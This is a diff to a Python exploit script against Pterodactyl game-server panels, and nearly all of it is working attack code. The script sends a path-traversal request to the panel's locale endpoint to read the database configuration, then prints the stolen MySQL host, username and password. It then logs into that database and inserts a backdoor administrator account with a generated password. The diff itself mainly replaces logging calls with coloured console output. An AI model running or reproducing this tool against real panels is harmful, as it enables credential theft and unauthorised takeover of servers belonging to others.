@@ -1,13 +1,12 @@
 import mysql.connector
 import bcrypt
-import logging
 import warnings
 import urllib3
 import requests
 import uuid
+import string
 from requests.exceptions import RequestException
 from plugins.common import *
-import string
 
 def exploit(target_url):
     warnings.filterwarnings("ignore", category=UserWarning)
@@ -16,6 +15,8 @@ def exploit(target_url):
     target_url = target_url.strip().rstrip('/') + '/'
     endpoint = f"{target_url}locales/locale.json?locale=../../../pterodactyl&namespace=config/database"
 
+    print(f"\n{gray}[{yellow}#{gray}] {white}Checking {yellow}{target_url}{white} for vuln...\n")
+
     try:
         response = requests.get(endpoint, allow_redirects=True, timeout=5, verify=False)
 
@@ -23,31 +24,35 @@ def exploit(target_url):
             try:
                 raw_data = response.json()
                 data = raw_data["../../../pterodactyl"]["config/database"]["connections"]["mysql"]
-                logging.info(f"Host: {data['host']}")
-                logging.info(f"Port: {data['port']}")
-                logging.info(f"Database: {data['database']}")
-                logging.info(f"Username: {data['username']}")
-                logging.info(f"Password: {data['password']}")
+                print(f"{gray}[{yellow}#{gray}] {green}Host is vulnerable!")
+                print(f"{gray}• {yellow}Host:     {white}{data['host']}")
+                print(f"{gray}• {yellow}Port:     {white}{data['port']}")
+                print(f"{gray}• {yellow}Database: {white}{data['database']}")
+                print(f"{gray}• {yellow}Username: {white}{data['username']}")
+                print(f"{gray}• {yellow}Password: {white}{data['password']}\n")
+
                 return data
             except (KeyError, TypeError):
-                logging.info("Vulnerable but no database information available")
+                print(f"{gray}[{yellow}#{gray}] {white}Vulnerable, but database info is unavailable\n")
                 return None
         else:
-            logging.error("Not vulnerable or data not found")
+            print(f"{gray}[{yellow}#{gray}] {white}Not vulnerable or data not found\n")
             return None
+
     except RequestException as e:
         if "NameResolutionError" in str(e):
-            logging.error("Invalid target or unable to resolve domain")
+            print(f"{gray}[{yellow}#{gray}] {white}Invalid target or unable to resolve domain\n")
         else:
-            logging.error(f"Request error: {e}")
+            print(f"{gray}[{yellow}#{gray}] {white}Request error: {e}\n")
         return None
 
-
 def ptero(target_url):
+    if not (target_url.startswith('http://') or target_url.startswith('https://')): target_url = 'https://' + target_url
     data = exploit(target_url)
     if not data:
-        logging.info("No database info provided. Cannot create admin user.")
         return
+
+    print(f"{gray}[{yellow}#{gray}] {white}Attempting to create admin account...\n")
 
     email = "banana@us.gov"
     username = "banana"
@@ -55,17 +60,18 @@ def ptero(target_url):
     last_name = "Republic"
     password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     uuid_str = str(uuid.uuid4())
+    host_clean = str(target_url).replace('https://', '').replace('http://', '').replace('/', '')
 
     try:
         conn = mysql.connector.connect(
-            host=str(target_url).replace('https://', '').replace('http://', '').replace('/', ''),
+            host=host_clean,
             port=int(data['port']),
             user=data['username'],
             password=data['password'],
             database=data['database']
         )
     except mysql.connector.Error as err:
-        logging.error(f"{err}")
+        print(f"{gray}[{yellow}#{gray}] {red}Connection error:{white} {err}\n")
         return
 
     cursor = conn.cursor()
@@ -95,9 +101,15 @@ def ptero(target_url):
             remember_token
         ))
         conn.commit()
-        logging.success(f"Admin user created! {email}:{username}:{password}")
+
+        print(f"{gray}[{yellow}#{gray}] {green}Admin Created\n")
+        print(f"{gray}• {yellow}Panel:    {white}{target_url}")
+        print(f"{gray}• {yellow}Username: {white}{username}")
+        print(f"{gray}• {yellow}Email:    {white}{email}")
+        print(f"{gray}• {yellow}Password: {white}{password}\n")
+
     except mysql.connector.Error as err:
-        logging.error(f"Failed to add admin user: {err}")
+        print(f"{gray}[{yellow}#{gray}] {red}Failed to add admin user:{white} {err}\n")
     finally:
         cursor.close()
         conn.close()
